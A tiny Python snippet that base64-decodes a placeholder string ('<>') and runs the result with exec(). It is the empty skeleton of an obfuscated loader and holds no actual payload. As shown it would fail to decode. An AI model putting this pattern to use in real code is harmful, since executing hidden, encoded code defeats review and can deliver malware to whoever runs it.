import base64


encoded_script = """
<>
"""


exec(base64.b64decode(encoded_script).decode('utf-8'))
